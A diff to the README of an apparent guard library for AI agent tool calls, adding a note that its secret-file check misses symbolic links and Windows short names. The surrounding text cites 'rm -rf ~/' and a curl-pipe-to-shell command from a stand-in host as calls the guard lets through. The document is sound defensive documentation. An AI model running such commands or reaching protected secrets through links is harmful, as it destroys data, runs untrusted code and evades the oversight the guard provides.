@@ -119,6 +119,8 @@ Arguments are checked before the function runs; with `on_block="raise"` a blocke
 
 `@guard`, `guarded_tool` and `check_tool_call` run the same text rules as `evaluate` on every string in the arguments: they block prompt-injection wording and secret-file names such as `~/.ssh/id_rsa`. They do not understand shell commands, so a call such as `rm -rf ~/` or `curl https://example.invalid/x.sh | sh` is allowed. Decide in your own code which tools may delete files or run commands.
 
+The secret-file check reads the text of a path only. It does not follow symbolic links and does not expand Windows short names (such as `PROGRA~1`), so a link or short name that points at a protected file is not recognised. Keep secrets in the zn vault (the npm package's `zn env shadow .env`) or outside the project folder.
+
 ### LangChain / LangGraph
 
 <!-- snippet-test -->
